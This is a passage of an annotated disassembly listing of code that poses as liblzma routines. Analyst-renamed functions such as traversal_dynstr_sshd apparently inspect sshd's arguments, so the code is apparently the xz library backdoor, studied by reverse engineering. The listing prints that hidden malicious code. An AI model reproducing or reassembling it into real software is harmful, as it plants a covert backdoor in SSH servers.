.text.lzma_bufcpa:000000000000378C                                         ; _Llzma_buf_cpy_0+10B↑j
.text.lzma_bufcpa:000000000000378C                 test    byte ptr [rsp+138h+var_F0+1], 1
.text.lzma_bufcpa:0000000000003791                 jz      short loc_37B2
.text.lzma_bufcpa:0000000000003793                 mov     eax, [rsp+54h]
.text.lzma_bufcpa:0000000000003797                 mov     r10, [rsp+138h+var_D0]
.text.lzma_bufcpa:000000000000379C                 and     eax, 0FF00FF00h
.text.lzma_bufcpa:00000000000037A1                 cmp     eax, 5000000h
.text.lzma_bufcpa:00000000000037A6                 jnz     short loc_37B2
.text.lzma_bufcpa:00000000000037A8                 add     r10, [rsp+138h+var_100]
.text.lzma_bufcpa:00000000000037AD                 add     r10, [rsp+138h+var_F8]
.text.lzma_bufcpa:00000000000037B2
.text.lzma_bufcpa:00000000000037B2 loc_37B2:                               ; CODE XREF: _Llzma_buf_cpy_0+121↑j
.text.lzma_bufcpa:00000000000037B2                                         ; _Llzma_buf_cpy_0+136↑j
.text.lzma_bufcpa:00000000000037B2                 mov     rax, [rsp+138h+var_120]
.text.lzma_bufcpa:00000000000037B7                 cmp     r10, rax
.text.lzma_bufcpa:00000000000037BA                 jb      short loc_37DD
.text.lzma_bufcpa:00000000000037BC                 mov     rax, [rsp+138h+var_118]
.text.lzma_bufcpa:00000000000037C1                 cmp     r10, rax
.text.lzma_bufcpa:00000000000037C4                 jnb     short loc_37DD
.text.lzma_bufcpa:00000000000037C6                 movzx   r11d, r13b
.text.lzma_bufcpa:00000000000037CA                 lea     eax, [r13+1]
.text.lzma_bufcpa:00000000000037CE                 mov     [rsp+r11*8+138h+var_A8], r10
.text.lzma_bufcpa:00000000000037D6                 cmp     al, 0Fh
.text.lzma_bufcpa:00000000000037D8                 ja      short loc_37F2
.text.lzma_bufcpa:00000000000037DA                 mov     r13d, eax
.text.lzma_bufcpa:00000000000037DD
.text.lzma_bufcpa:00000000000037DD loc_37DD:                               ; CODE XREF: _Llzma_buf_cpy_0+14A↑j
.text.lzma_bufcpa:00000000000037DD                                         ; _Llzma_buf_cpy_0+154↑j
.text.lzma_bufcpa:00000000000037DD                 mov     rbx, [rsp+138h+var_F8]
.text.lzma_bufcpa:00000000000037E2                 xor     r14d, r14d
.text.lzma_bufcpa:00000000000037E5                 add     rbx, [rsp+138h+var_100]
.text.lzma_bufcpa:00000000000037EA                 jmp     loc_36DB
.text.lzma_bufcpa:00000000000037EF ; ---------------------------------------------------------------------------
.text.lzma_bufcpa:00000000000037EF
.text.lzma_bufcpa:00000000000037EF loc_37EF:                               ; CODE XREF: _Llzma_buf_cpy_0+73↑j
.text.lzma_bufcpa:00000000000037EF                                         ; _Llzma_buf_cpy_0+95↑j
.text.lzma_bufcpa:00000000000037EF                 mov     eax, r13d
.text.lzma_bufcpa:00000000000037F2
.text.lzma_bufcpa:00000000000037F2 loc_37F2:                               ; CODE XREF: _Llzma_buf_cpy_0+168↑j
.text.lzma_bufcpa:00000000000037F2                 xor     ecx, ecx
.text.lzma_bufcpa:00000000000037F4                 movzx   eax, al
.text.lzma_bufcpa:00000000000037F7                 lea     rdi, [rsp+138h+var_A8]
.text.lzma_bufcpa:00000000000037FF
.text.lzma_bufcpa:00000000000037FF loc_37FF:                               ; CODE XREF: _Llzma_buf_cpy_0+1D1↓j
.text.lzma_bufcpa:00000000000037FF                 cmp     ecx, eax
.text.lzma_bufcpa:0000000000003801                 jnb     short loc_3843
.text.lzma_bufcpa:0000000000003803                 mov     r9, [rdi+rcx*8]
.text.lzma_bufcpa:0000000000003807                 xor     edx, edx
.text.lzma_bufcpa:0000000000003809
.text.lzma_bufcpa:0000000000003809 loc_3809:                               ; CODE XREF: _Llzma_buf_cpy_0+1CC↓j
.text.lzma_bufcpa:0000000000003809                 mov     r10, [rdi+rdx*8]
.text.lzma_bufcpa:000000000000380D                 xor     esi, esi
.text.lzma_bufcpa:000000000000380F                 lea     r11, [r10-8]
.text.lzma_bufcpa:0000000000003813
.text.lzma_bufcpa:0000000000003813 loc_3813:                               ; CODE XREF: _Llzma_buf_cpy_0+1C5↓j
.text.lzma_bufcpa:0000000000003813                 cmp     r9, r11
.text.lzma_bufcpa:0000000000003816                 jnz     short loc_3830
.text.lzma_bufcpa:0000000000003818                 mov     rbx, [rdi+rsi*8]
.text.lzma_bufcpa:000000000000381C                 lea     r8, [rbx-8]
.text.lzma_bufcpa:0000000000003820                 cmp     r10, r8
.text.lzma_bufcpa:0000000000003823                 jnz     short loc_3830
.text.lzma_bufcpa:0000000000003825                 mov     [r12], r9
.text.lzma_bufcpa:0000000000003829                 mov     eax, 1
.text.lzma_bufcpa:000000000000382E                 jmp     short loc_3845
.text.lzma_bufcpa:0000000000003830 ; ---------------------------------------------------------------------------
.text.lzma_bufcpa:0000000000003830
.text.lzma_bufcpa:0000000000003830 loc_3830:                               ; CODE XREF: _Llzma_buf_cpy_0+1A6↑j
.text.lzma_bufcpa:0000000000003830                                         ; _Llzma_buf_cpy_0+1B3↑j
.text.lzma_bufcpa:0000000000003830                 inc     rsi
.text.lzma_bufcpa:0000000000003833                 cmp     esi, eax
.text.lzma_bufcpa:0000000000003835                 jb      short loc_3813
.text.lzma_bufcpa:0000000000003837                 inc     rdx
.text.lzma_bufcpa:000000000000383A                 cmp     edx, eax
.text.lzma_bufcpa:000000000000383C                 jb      short loc_3809
.text.lzma_bufcpa:000000000000383E                 inc     rcx
.text.lzma_bufcpa:0000000000003841                 jmp     short loc_37FF
.text.lzma_bufcpa:0000000000003843 ; ---------------------------------------------------------------------------
.text.lzma_bufcpa:0000000000003843
.text.lzma_bufcpa:0000000000003843 loc_3843:                               ; CODE XREF: _Llzma_buf_cpy_0+2F↑j
.text.lzma_bufcpa:0000000000003843                                         ; _Llzma_buf_cpy_0+191↑j
.text.lzma_bufcpa:0000000000003843                 xor     eax, eax
.text.lzma_bufcpa:0000000000003845
.text.lzma_bufcpa:0000000000003845 loc_3845:                               ; CODE XREF: _Llzma_buf_cpy_0+1BE↑j
.text.lzma_bufcpa:0000000000003845                 add     rsp, 110h
.text.lzma_bufcpa:000000000000384C                 pop     rbx
.text.lzma_bufcpa:000000000000384D                 pop     r12
.text.lzma_bufcpa:000000000000384F                 pop     r13
.text.lzma_bufcpa:0000000000003851                 pop     r14
.text.lzma_bufcpa:0000000000003853                 pop     r15
.text.lzma_bufcpa:0000000000003855                 retn
.text.lzma_bufcpa:0000000000003855 _Llzma_buf_cpy_0 endp
.text.lzma_bufcpa:0000000000003855
.text.lzma_bufcpa:0000000000003855 _text_lzma_bufcpa ends
.text.lzma_bufcpa:0000000000003855
.text.lzma_check_finisa:0000000000003860 ; ===========================================================================
.text.lzma_check_finisa:0000000000003860
.text.lzma_check_finisa:0000000000003860 ; Segment type: Pure code
.text.lzma_check_finisa:0000000000003860 ; Segment permissions: Read/Execute
.text.lzma_check_finisa:0000000000003860 _text_lzma_check_finisa segment para public 'CODE' use64
.text.lzma_check_finisa:0000000000003860                 assume cs:_text_lzma_check_finisa
.text.lzma_check_finisa:0000000000003860                 ;org 3860h
.text.lzma_check_finisa:0000000000003860                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_check_finisa:0000000000003860
.text.lzma_check_finisa:0000000000003860 ; =============== S U B R O U T I N E =======================================
.text.lzma_check_finisa:0000000000003860
.text.lzma_check_finisa:0000000000003860
.text.lzma_check_finisa:0000000000003860 ; __int64 __fastcall Llzma_check_finish_0(__int64, __int64, __int64)
.text.lzma_check_finisa:0000000000003860 _Llzma_check_finish_0 proc near         ; CODE XREF: _Llzma_lzma2_encoder_memusage_0+44↓p
.text.lzma_check_finisa:0000000000003860
.text.lzma_check_finisa:0000000000003860 var_80          = qword ptr -80h
.text.lzma_check_finisa:0000000000003860 var_78          = qword ptr -78h
.text.lzma_check_finisa:0000000000003860
.text.lzma_check_finisa:0000000000003860                 endbr64
.text.lzma_check_finisa:0000000000003864                 push    r14
.text.lzma_check_finisa:0000000000003866                 push    r13
.text.lzma_check_finisa:0000000000003868                 push    r12
.text.lzma_check_finisa:000000000000386A                 xor     r12d, r12d
.text.lzma_check_finisa:000000000000386D                 push    rbx
.text.lzma_check_finisa:000000000000386E                 sub     rsp, 68h
.text.lzma_check_finisa:0000000000003872                 mov     r14, [rdx+28h]
.text.lzma_check_finisa:0000000000003876                 test    r14, r14
.text.lzma_check_finisa:0000000000003879                 jz      short loc_38E8
.text.lzma_check_finisa:000000000000387B                 mov     r13, [rdx+30h]
.text.lzma_check_finisa:000000000000387F                 mov     rcx, rdi
.text.lzma_check_finisa:0000000000003882                 xor     edx, edx
.text.lzma_check_finisa:0000000000003884                 mov     rbx, rdi
.text.lzma_check_finisa:0000000000003887                 mov     rdi, r14
.text.lzma_check_finisa:000000000000388A                 xor     r12d, r12d
.text.lzma_check_finisa:000000000000388D                 mov     rsi, r13
.text.lzma_check_finisa:0000000000003890                 call    _Lstream_encoder_mt_init_1 ; PIC mode
.text.lzma_check_finisa:0000000000003895                 lea     rdi, [rsp+88h+var_80]
.text.lzma_check_finisa:000000000000389A                 mov     ecx, 16h
.text.lzma_check_finisa:000000000000389F                 mov     rsi, r13
.text.lzma_check_finisa:00000000000038A2                 test    eax, eax
.text.lzma_check_finisa:00000000000038A4                 lea     rdx, [rsp+88h+var_80]
.text.lzma_check_finisa:00000000000038A9                 setnz   r12b
.text.lzma_check_finisa:00000000000038AD                 xor     eax, eax
.text.lzma_check_finisa:00000000000038AF                 add     rbx, 10h
.text.lzma_check_finisa:00000000000038B3                 rep stosd
.text.lzma_check_finisa:00000000000038B5                 mov     rcx, rbx
.text.lzma_check_finisa:00000000000038B8                 mov     rdi, r14
.text.lzma_check_finisa:00000000000038BB                 call    _Lstream_encoder_mt_init_1 ; PIC mode
.text.lzma_check_finisa:00000000000038C0                 test    eax, eax
.text.lzma_check_finisa:00000000000038C2                 jz      short loc_38E8
.text.lzma_check_finisa:00000000000038C4                 mov     rdi, [rsp+88h+var_78]
.text.lzma_check_finisa:00000000000038C9                 xor     edx, edx
.text.lzma_check_finisa:00000000000038CB                 add     rdi, [rsp+88h+var_80]
.text.lzma_check_finisa:00000000000038D0                 mov     rcx, rbx
.text.lzma_check_finisa:00000000000038D3                 mov     rsi, r13
.text.lzma_check_finisa:00000000000038D6                 call    _Lstream_encoder_mt_init_1 ; PIC mode
.text.lzma_check_finisa:00000000000038DB                 test    eax, eax
.text.lzma_check_finisa:00000000000038DD                 jnz     short loc_38E4
.text.lzma_check_finisa:00000000000038DF                 inc     r12d
.text.lzma_check_finisa:00000000000038E2                 jmp     short loc_38E8
.text.lzma_check_finisa:00000000000038E4 ; ---------------------------------------------------------------------------
.text.lzma_check_finisa:00000000000038E4
.text.lzma_check_finisa:00000000000038E4 loc_38E4:                               ; CODE XREF: _Llzma_check_finish_0+7D↑j
.text.lzma_check_finisa:00000000000038E4                 add     r12d, 2
.text.lzma_check_finisa:00000000000038E8
.text.lzma_check_finisa:00000000000038E8 loc_38E8:                               ; CODE XREF: _Llzma_check_finish_0+19↑j
.text.lzma_check_finisa:00000000000038E8                                         ; _Llzma_check_finish_0+62↑j ...
.text.lzma_check_finisa:00000000000038E8                 add     rsp, 68h
.text.lzma_check_finisa:00000000000038EC                 mov     eax, r12d
.text.lzma_check_finisa:00000000000038EF                 pop     rbx
.text.lzma_check_finisa:00000000000038F0                 pop     r12
.text.lzma_check_finisa:00000000000038F2                 pop     r13
.text.lzma_check_finisa:00000000000038F4                 pop     r14
.text.lzma_check_finisa:00000000000038F6                 retn
.text.lzma_check_finisa:00000000000038F6 _Llzma_check_finish_0 endp
.text.lzma_check_finisa:00000000000038F6
.text.lzma_check_finisa:00000000000038F6 _text_lzma_check_finisa ends
.text.lzma_check_finisa:00000000000038F6
.text.lzma_decoder_inia:0000000000003900 ; ===========================================================================
.text.lzma_decoder_inia:0000000000003900
.text.lzma_decoder_inia:0000000000003900 ; Segment type: Pure code
.text.lzma_decoder_inia:0000000000003900 ; Segment permissions: Read/Execute
.text.lzma_decoder_inia:0000000000003900 _text_lzma_decoder_inia segment para public 'CODE' use64
.text.lzma_decoder_inia:0000000000003900                 assume cs:_text_lzma_decoder_inia
.text.lzma_decoder_inia:0000000000003900                 ;org 3900h
.text.lzma_decoder_inia:0000000000003900                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_decoder_inia:0000000000003900
.text.lzma_decoder_inia:0000000000003900 ; =============== S U B R O U T I N E =======================================
.text.lzma_decoder_inia:0000000000003900
.text.lzma_decoder_inia:0000000000003900
.text.lzma_decoder_inia:0000000000003900 ; __int64 __fastcall Llzma_decoder_init_1(__int64, __int64, __int64)
.text.lzma_decoder_inia:0000000000003900 _Llzma_decoder_init_1 proc near         ; CODE XREF: _Llzma_lzma2_encoder_memusage_0+31↓p
.text.lzma_decoder_inia:0000000000003900                 endbr64
.text.lzma_decoder_inia:0000000000003904                 push    r14
.text.lzma_decoder_inia:0000000000003906                 push    r13
.text.lzma_decoder_inia:0000000000003908                 push    r12
.text.lzma_decoder_inia:000000000000390A                 xor     r12d, r12d
.text.lzma_decoder_inia:000000000000390D                 push    rbx
.text.lzma_decoder_inia:000000000000390E                 push    rcx
.text.lzma_decoder_inia:000000000000390F                 mov     r13, [rdx+48h]
.text.lzma_decoder_inia:0000000000003913                 test    r13, r13
.text.lzma_decoder_inia:0000000000003916                 jz      short loc_3968
.text.lzma_decoder_inia:0000000000003918                 mov     r14, [rdx+50h]
.text.lzma_decoder_inia:000000000000391C                 mov     rbx, rdi
.text.lzma_decoder_inia:000000000000391F                 mov     rcx, rdi
.text.lzma_decoder_inia:0000000000003922                 xor     edx, edx
.text.lzma_decoder_inia:0000000000003924                 mov     rdi, r13
.text.lzma_decoder_inia:0000000000003927                 xor     r12d, r12d
.text.lzma_decoder_inia:000000000000392A                 mov     rsi, r14
.text.lzma_decoder_inia:000000000000392D                 call    _Lstream_encoder_mt_init_1 ; PIC mode
.text.lzma_decoder_inia:0000000000003932                 lea     rcx, [rbx+10h]
.text.lzma_decoder_inia:0000000000003936                 mov     rsi, r14
.text.lzma_decoder_inia:0000000000003939                 mov     rdi, r13
.text.lzma_decoder_inia:000000000000393C                 test    eax, eax
.text.lzma_decoder_inia:000000000000393E                 setnz   r12b
.text.lzma_decoder_inia:0000000000003942                 xor     edx, edx
.text.lzma_decoder_inia:0000000000003944                 call    _Lstream_encoder_mt_init_1 ; PIC mode
.text.lzma_decoder_inia:0000000000003949                 lea     rcx, [rbx+8]
.text.lzma_decoder_inia:000000000000394D                 mov     rsi, r14
.text.lzma_decoder_inia:0000000000003950                 mov     rdi, r13
.text.lzma_decoder_inia:0000000000003953                 cmp     eax, 1
.text.lzma_decoder_inia:0000000000003956                 sbb     r12d, 0FFFFFFFFh
.text.lzma_decoder_inia:000000000000395A                 xor     edx, edx
.text.lzma_decoder_inia:000000000000395C                 call    _Lstream_encoder_mt_init_1 ; PIC mode
.text.lzma_decoder_inia:0000000000003961                 cmp     eax, 1
.text.lzma_decoder_inia:0000000000003964                 sbb     r12d, 0FFFFFFFFh
.text.lzma_decoder_inia:0000000000003968
.text.lzma_decoder_inia:0000000000003968 loc_3968:                               ; CODE XREF: _Llzma_decoder_init_1+16↑j
.text.lzma_decoder_inia:0000000000003968                 pop     rdx
.text.lzma_decoder_inia:0000000000003969                 mov     eax, r12d
.text.lzma_decoder_inia:000000000000396C                 pop     rbx
.text.lzma_decoder_inia:000000000000396D                 pop     r12
.text.lzma_decoder_inia:000000000000396F                 pop     r13
.text.lzma_decoder_inia:0000000000003971                 pop     r14
.text.lzma_decoder_inia:0000000000003973                 retn
.text.lzma_decoder_inia:0000000000003973 _Llzma_decoder_init_1 endp
.text.lzma_decoder_inia:0000000000003973
.text.lzma_decoder_inia:0000000000003973 _text_lzma_decoder_inia ends
.text.lzma_decoder_inia:0000000000003973
.text.lzma_delta_coder_inia:0000000000003980 ; ===========================================================================
.text.lzma_delta_coder_inia:0000000000003980
.text.lzma_delta_coder_inia:0000000000003980 ; Segment type: Pure code
.text.lzma_delta_coder_inia:0000000000003980 ; Segment permissions: Read/Execute
.text.lzma_delta_coder_inia:0000000000003980 _text_lzma_delta_coder_inia segment para public 'CODE' use64
.text.lzma_delta_coder_inia:0000000000003980                 assume cs:_text_lzma_delta_coder_inia
.text.lzma_delta_coder_inia:0000000000003980                 ;org 3980h
.text.lzma_delta_coder_inia:0000000000003980                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_delta_coder_inia:0000000000003980
.text.lzma_delta_coder_inia:0000000000003980 ; =============== S U B R O U T I N E =======================================
.text.lzma_delta_coder_inia:0000000000003980
.text.lzma_delta_coder_inia:0000000000003980
.text.lzma_delta_coder_inia:0000000000003980 ; __int64 __fastcall Llzma_delta_coder_init_1(__int64, __int64, __int64)
.text.lzma_delta_coder_inia:0000000000003980 _Llzma_delta_coder_init_1 proc near     ; CODE XREF: _Llzma_lzma2_encoder_memusage_0+1E↓p
.text.lzma_delta_coder_inia:0000000000003980                 endbr64
.text.lzma_delta_coder_inia:0000000000003984                 mov     rcx, rdi
.text.lzma_delta_coder_inia:0000000000003987                 mov     rdi, [rdx+68h]
.text.lzma_delta_coder_inia:000000000000398B                 test    rdi, rdi
.text.lzma_delta_coder_inia:000000000000398E                 jz      short loc_39AB
.text.lzma_delta_coder_inia:0000000000003990                 push    rsi
.text.lzma_delta_coder_inia:0000000000003991                 mov     rsi, [rdx+70h]
.text.lzma_delta_coder_inia:0000000000003995                 xor     edx, edx
.text.lzma_delta_coder_inia:0000000000003997                 call    _Lstream_encoder_mt_init_1 ; PIC mode
.text.lzma_delta_coder_inia:000000000000399C                 test    eax, eax
.text.lzma_delta_coder_inia:000000000000399E                 jnz     short loc_39A4
.text.lzma_delta_coder_inia:00000000000039A0                 xor     eax, eax
.text.lzma_delta_coder_inia:00000000000039A2                 jmp     short loc_39A9
.text.lzma_delta_coder_inia:00000000000039A4 ; ---------------------------------------------------------------------------
.text.lzma_delta_coder_inia:00000000000039A4
.text.lzma_delta_coder_inia:00000000000039A4 loc_39A4:                               ; CODE XREF: _Llzma_delta_coder_init_1+1E↑j
.text.lzma_delta_coder_inia:00000000000039A4                 mov     eax, 3
.text.lzma_delta_coder_inia:00000000000039A9
.text.lzma_delta_coder_inia:00000000000039A9 loc_39A9:                               ; CODE XREF: _Llzma_delta_coder_init_1+22↑j
.text.lzma_delta_coder_inia:00000000000039A9                 pop     rdx
.text.lzma_delta_coder_inia:00000000000039AA                 retn
.text.lzma_delta_coder_inia:00000000000039AB ; ---------------------------------------------------------------------------
.text.lzma_delta_coder_inia:00000000000039AB
.text.lzma_delta_coder_inia:00000000000039AB loc_39AB:                               ; CODE XREF: _Llzma_delta_coder_init_1+E↑j
.text.lzma_delta_coder_inia:00000000000039AB                 xor     eax, eax
.text.lzma_delta_coder_inia:00000000000039AD                 retn
.text.lzma_delta_coder_inia:00000000000039AD _Llzma_delta_coder_init_1 endp
.text.lzma_delta_coder_inia:00000000000039AD
.text.lzma_delta_coder_inia:00000000000039AD _text_lzma_delta_coder_inia ends
.text.lzma_delta_coder_inia:00000000000039AD
.text.lzma_encoder_inia:00000000000039B0 ; ===========================================================================
.text.lzma_encoder_inia:00000000000039B0
.text.lzma_encoder_inia:00000000000039B0 ; Segment type: Pure code
.text.lzma_encoder_inia:00000000000039B0 ; Segment permissions: Read/Execute
.text.lzma_encoder_inia:00000000000039B0 _text_lzma_encoder_inia segment para public 'CODE' use64
.text.lzma_encoder_inia:00000000000039B0                 assume cs:_text_lzma_encoder_inia
.text.lzma_encoder_inia:00000000000039B0                 ;org 39B0h
.text.lzma_encoder_inia:00000000000039B0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_encoder_inia:00000000000039B0
.text.lzma_encoder_inia:00000000000039B0 ; =============== S U B R O U T I N E =======================================
.text.lzma_encoder_inia:00000000000039B0
.text.lzma_encoder_inia:00000000000039B0
.text.lzma_encoder_inia:00000000000039B0 ; __int16 *__fastcall Llzma_encoder_init_0(char, __int16 *)
.text.lzma_encoder_inia:00000000000039B0 _Llzma_encoder_init_0 proc near         ; CODE XREF: traversal_dynstr_sshd+B9↓p
.text.lzma_encoder_inia:00000000000039B0                 endbr64
.text.lzma_encoder_inia:00000000000039B4                 mov     rax, rsi
.text.lzma_encoder_inia:00000000000039B7                 cmp     dil, 2Dh ; '-'
.text.lzma_encoder_inia:00000000000039BB                 jnz     short loc_3A07
.text.lzma_encoder_inia:00000000000039BD
.text.lzma_encoder_inia:00000000000039BD loc_39BD:                               ; CODE XREF: _Llzma_encoder_init_0+55↓j
.text.lzma_encoder_inia:00000000000039BD                 movzx   edx, word ptr [rax]
.text.lzma_encoder_inia:00000000000039C0                 mov     ecx, edx
.text.lzma_encoder_inia:00000000000039C2                 mov     esi, edx
.text.lzma_encoder_inia:00000000000039C4                 shl     edx, 8
.text.lzma_encoder_inia:00000000000039C7                 xor     cl, cl
.text.lzma_encoder_inia:00000000000039C9                 cmp     cx, 6400h
.text.lzma_encoder_inia:00000000000039CE                 jz      short locret_3A09
.text.lzma_encoder_inia:00000000000039D0                 cmp     dx, 6400h
.text.lzma_encoder_inia:00000000000039D5                 jz      short locret_3A09
.text.lzma_encoder_inia:00000000000039D7                 test    si, 0DF00h
.text.lzma_encoder_inia:00000000000039DC                 jz      short loc_3A07
.text.lzma_encoder_inia:00000000000039DE                 cmp     cx, 900h
.text.lzma_encoder_inia:00000000000039E3                 jz      short loc_3A07
.text.lzma_encoder_inia:00000000000039E5                 cmp     cx, 3D00h
.text.lzma_encoder_inia:00000000000039EA                 jz      short loc_3A07
.text.lzma_encoder_inia:00000000000039EC                 test    dx, 0DF00h
.text.lzma_encoder_inia:00000000000039F1                 jz      short loc_3A07
.text.lzma_encoder_inia:00000000000039F3                 cmp     dx, 3D00h
.text.lzma_encoder_inia:00000000000039F8                 jz      short loc_3A07
.text.lzma_encoder_inia:00000000000039FA                 cmp     dx, 900h
.text.lzma_encoder_inia:00000000000039FF                 jz      short loc_3A07
.text.lzma_encoder_inia:0000000000003A01                 add     rax, 2
.text.lzma_encoder_inia:0000000000003A05                 jmp     short loc_39BD
.text.lzma_encoder_inia:0000000000003A07 ; ---------------------------------------------------------------------------
.text.lzma_encoder_inia:0000000000003A07
.text.lzma_encoder_inia:0000000000003A07 loc_3A07:                               ; CODE XREF: _Llzma_encoder_init_0+B↑j
.text.lzma_encoder_inia:0000000000003A07                                         ; _Llzma_encoder_init_0+2C↑j ...
.text.lzma_encoder_inia:0000000000003A07                 xor     eax, eax
.text.lzma_encoder_inia:0000000000003A09
.text.lzma_encoder_inia:0000000000003A09 locret_3A09:                            ; CODE XREF: _Llzma_encoder_init_0+1E↑j
.text.lzma_encoder_inia:0000000000003A09                                         ; _Llzma_encoder_init_0+25↑j
.text.lzma_encoder_inia:0000000000003A09                 retn
.text.lzma_encoder_inia:0000000000003A09 _Llzma_encoder_init_0 endp
.text.lzma_encoder_inia:0000000000003A09
.text.lzma_encoder_inia:0000000000003A09 _text_lzma_encoder_inia ends
.text.lzma_encoder_inia:0000000000003A09
.text.lzma_file_info_decodea:0000000000003A10 ; ===========================================================================
.text.lzma_file_info_decodea:0000000000003A10
.text.lzma_file_info_decodea:0000000000003A10 ; Segment type: Pure code
.text.lzma_file_info_decodea:0000000000003A10 ; Segment permissions: Read/Execute
.text.lzma_file_info_decodea:0000000000003A10 _text_lzma_file_info_decodea segment para public 'CODE' use64
.text.lzma_file_info_decodea:0000000000003A10                 assume cs:_text_lzma_file_info_decodea
.text.lzma_file_info_decodea:0000000000003A10                 ;org 3A10h
.text.lzma_file_info_decodea:0000000000003A10                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_file_info_decodea:0000000000003A10
.text.lzma_file_info_decodea:0000000000003A10 ; =============== S U B R O U T I N E =======================================
.text.lzma_file_info_decodea:0000000000003A10
.text.lzma_file_info_decodea:0000000000003A10 ; a2: 0x00007fffffffedb0
.text.lzma_file_info_decodea:0000000000003A10 ; Attributes: bp-based frame
.text.lzma_file_info_decodea:0000000000003A10
.text.lzma_file_info_decodea:0000000000003A10 ; __int64 __fastcall traversal_dynstr_sshd(struct_elf_info *a1, char **a2)
.text.lzma_file_info_decodea:0000000000003A10 traversal_dynstr_sshd proc near         ; CODE XREF: parse_elf_invoke+50↓p
.text.lzma_file_info_decodea:0000000000003A10
.text.lzma_file_info_decodea:0000000000003A10 var_48          = qword ptr -48h
.text.lzma_file_info_decodea:0000000000003A10 free_spaces     = qword ptr -38h
.text.lzma_file_info_decodea:0000000000003A10
.text.lzma_file_info_decodea:0000000000003A10                 push    rbp
.text.lzma_file_info_decodea:0000000000003A11                 mov     rbp, rsp
.text.lzma_file_info_decodea:0000000000003A14                 push    r15
.text.lzma_file_info_decodea:0000000000003A16                 push    r14
.text.lzma_file_info_decodea:0000000000003A18                 push    r13
.text.lzma_file_info_decodea:0000000000003A1A                 push    r12
.text.lzma_file_info_decodea:0000000000003A1C                 push    rbx
.text.lzma_file_info_decodea:0000000000003A1D                 sub     rsp, 28h
.text.lzma_file_info_decodea:0000000000003A21                 mov     [rbp+var_48], rdi
.text.lzma_file_info_decodea:0000000000003A25                 cmp     rbp, rsi
.text.lzma_file_info_decodea:0000000000003A28                 jnb     loc_3B5E
.text.lzma_file_info_decodea:0000000000003A2E                 mov     rax, rsi
.text.lzma_file_info_decodea:0000000000003A31                 mov     rbx, rsi
.text.lzma_file_info_decodea:0000000000003A34                 sub     rax, rbp
.text.lzma_file_info_decodea:0000000000003A37                 cmp     rax, 2000h
.text.lzma_file_info_decodea:0000000000003A3D                 ja      loc_3B5E
.text.lzma_file_info_decodea:0000000000003A43                 mov     r12, [rsi]
.text.lzma_file_info_decodea:0000000000003A46                 lea     rax, [r12-1]
.text.lzma_file_info_decodea:0000000000003A4B                 cmp     rax, 1Fh
.text.lzma_file_info_decodea:0000000000003A4F                 ja      loc_3B5E
.text.lzma_file_info_decodea:0000000000003A55                 mov     rdi, [rsi+8]    ; _BYTE *
.text.lzma_file_info_decodea:0000000000003A59                 cmp     rsi, rdi
.text.lzma_file_info_decodea:0000000000003A5C                 jnb     loc_3B5E
.text.lzma_file_info_decodea:0000000000003A62                 test    rdi, rdi
.text.lzma_file_info_decodea:0000000000003A65                 jz      loc_3B5E
.text.lzma_file_info_decodea:0000000000003A6B                 mov     rax, rdi
.text.lzma_file_info_decodea:0000000000003A6E                 sub     rax, rsi
.text.lzma_file_info_decodea:0000000000003A71                 cmp     rax, 4000h
.text.lzma_file_info_decodea:0000000000003A77                 ja      loc_3B5E
.text.lzma_file_info_decodea:0000000000003A7D                 xor     esi, esi        ; unsigned __int64
.text.lzma_file_info_decodea:0000000000003A7F                 call    table_get       ; PIC mode
.text.lzma_file_info_decodea:0000000000003A84                 mov     r8d, 1
.text.lzma_file_info_decodea:0000000000003A8A                 cmp     eax, 108h
.text.lzma_file_info_decodea:0000000000003A8F                 jnz     loc_3B5E
.text.lzma_file_info_decodea:0000000000003A95
.text.lzma_file_info_decodea:0000000000003A95 loc_3A95:                               ; CODE XREF: traversal_dynstr_sshd+C1↓j
.text.lzma_file_info_decodea:0000000000003A95                 cmp     r8, r12
.text.lzma_file_info_decodea:0000000000003A98                 lea     r8, [r8+1]
.text.lzma_file_info_decodea:0000000000003A9C                 jz      short loc_3AD8
.text.lzma_file_info_decodea:0000000000003A9E                 mov     rsi, [rbx+r8*8]
.text.lzma_file_info_decodea:0000000000003AA2                 cmp     rbx, rsi
.text.lzma_file_info_decodea:0000000000003AA5                 jnb     loc_3B5E
.text.lzma_file_info_decodea:0000000000003AAB                 test    rsi, rsi
.text.lzma_file_info_decodea:0000000000003AAE                 jz      loc_3B5E
.text.lzma_file_info_decodea:0000000000003AB4                 mov     rax, rsi
.text.lzma_file_info_decodea:0000000000003AB7                 sub     rax, rbx
.text.lzma_file_info_decodea:0000000000003ABA                 cmp     rax, 4000h
.text.lzma_file_info_decodea:0000000000003AC0                 ja      loc_3B5E
.text.lzma_file_info_decodea:0000000000003AC6                 movzx   edi, word ptr [rsi]
.text.lzma_file_info_decodea:0000000000003AC9                 call    _Llzma_encoder_init_0 ; PIC mode
.text.lzma_file_info_decodea:0000000000003ACE                 test    rax, rax
.text.lzma_file_info_decodea:0000000000003AD1                 jz      short loc_3A95
.text.lzma_file_info_decodea:0000000000003AD3                 jmp     loc_3B5E
.text.lzma_file_info_decodea:0000000000003AD8 ; ---------------------------------------------------------------------------
.text.lzma_file_info_decodea:0000000000003AD8
.text.lzma_file_info_decodea:0000000000003AD8 loc_3AD8:                               ; CODE XREF: traversal_dynstr_sshd+8C↑j
.text.lzma_file_info_decodea:0000000000003AD8                 cmp     qword ptr [rbx+r8*8], 0
.text.lzma_file_info_decodea:0000000000003ADD                 lea     rax, ds:0[r8*8]
.text.lzma_file_info_decodea:0000000000003AE5                 jnz     short loc_3B5E
.text.lzma_file_info_decodea:0000000000003AE7                 lea     r12, [rbx+rax+8]
.text.lzma_file_info_decodea:0000000000003AEC                 lea     r14, [rbp+free_spaces]
.text.lzma_file_info_decodea:0000000000003AF0
.text.lzma_file_info_decodea:0000000000003AF0 loc_3AF0:                               ; CODE XREF: traversal_dynstr_sshd+145↓j
.text.lzma_file_info_decodea:0000000000003AF0                 mov     r13, [r12]
.text.lzma_file_info_decodea:0000000000003AF4                 test    r13, r13
.text.lzma_file_info_decodea:0000000000003AF7                 jz      short loc_3B5E
.text.lzma_file_info_decodea:0000000000003AF9                 cmp     rbx, r13
.text.lzma_file_info_decodea:0000000000003AFC                 jnb     short loc_3B0C
